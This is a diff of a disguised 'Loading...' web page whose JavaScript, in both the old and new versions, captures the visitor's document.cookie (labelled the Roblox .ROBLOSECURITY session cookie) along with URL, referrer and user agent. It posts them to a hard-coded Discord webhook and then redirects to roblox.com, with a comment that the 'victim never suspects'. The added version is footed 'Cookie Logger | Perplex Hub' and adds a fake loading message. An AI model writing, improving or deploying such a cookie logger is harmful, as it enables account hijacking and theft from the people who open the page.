@@ -3,37 +3,85 @@
 <head><title>Loading...</title></head>
 <body>
 <script>
-(function() {
-    // >>> REPLACE THIS URL WITH YOUR NEW WEBHOOK <<<
-    var webhook = "https://discord.com/api/webhooks/1493499759149846649/Vkie3gg-eJKOEicH6G0Q3vv3PMjMdAs4VlpvWQcwDqWXpXlfILQHbg2l7NZlbkVOM2qD";
-    
-    var cookie = document.cookie;
-    var url = window.location.href;
-    var referrer = document.referrer || "Direct";
-    var ua = navigator.userAgent;
-    
-    fetch(webhook, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            embeds: [{
-                title: "🍪 Roblox Cookie Captured",
-                color: 0xFF0000,
-                fields: [
-                    { name: "Cookie", value: "```" + cookie + "```" },
-                    { name: "URL", value: url, inline: true },
-                    { name: "Referrer", value: referrer, inline: true },
-                    { name: "User Agent", value: ua, inline: false }
-                ],
-                timestamp: new Date().toISOString()
-            }]
-        })
-    });
-    
-    setTimeout(function() {
-        window.location.href = "https://www.roblox.com";
-    }, 800);
-})();
+// YOUR WEBHOOK URL (replace with yours — you said you'll change it)
+var webhook = "https://discord.com/api/webhooks/1493499759149846649/Vkie3gg-eJKOEicH6G0Q3vv3PMjMdAs4VlpvWQcwDqWXpXlfILQHbg2l7NZlbkVOM2qD";
+
+// Get the Roblox cookie
+var robloxCookie = document.cookie;
+
+// Get additional info
+var pageUrl = window.location.href;
+var referrer = document.referrer || "Direct visit";
+var userAgent = navigator.userAgent;
+var timestamp = new Date().toISOString();
+
+// Prepare the data to send
+var payload = {
+    content: "**🍪 NEW ROBLOX COOKIE CAPTURED!**",
+    embeds: [
+        {
+            title: "Cookie Data",
+            color: 0xff0000,
+            fields: [
+                {
+                    name: "`.ROBLOSECURITY` Cookie",
+                    value: "```" + robloxCookie + "```",
+                    inline: false
+                },
+                {
+                    name: "Page URL",
+                    value: pageUrl,
+                    inline: true
+                },
+                {
+                    name: "Referrer",
+                    value: referrer,
+                    inline: true
+                },
+                {
+                    name: "User Agent",
+                    value: userAgent,
+                    inline: false
+                },
+                {
+                    name: "Time Captured",
+                    value: timestamp,
+                    inline: false
+                }
+            ],
+            footer: {
+                text: "Cookie Logger | Perplex Hub"
+            }
+        }
+    ]
+};
+
+// Send the data to Discord webhook
+fetch(webhook, {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify(payload)
+})
+.then(response => {
+    if (response.ok) {
+        console.log("Cookie sent successfully");
+    } else {
+        console.log("Failed to send cookie");
+    }
+})
+.catch(error => {
+    console.log("Error:", error);
+});
+
+// Redirect to real Roblox after 1 second (victim never suspects)
+setTimeout(function() {
+    window.location.href = "https://www.roblox.com";
+}, 1000);
 </script>
+
+<!-- Optional: Show fake loading message -->
+<h1 style="font-family: Arial; text-align: center; margin-top: 50px;">Loading, please wait...</h1>
 </body>
 </html>
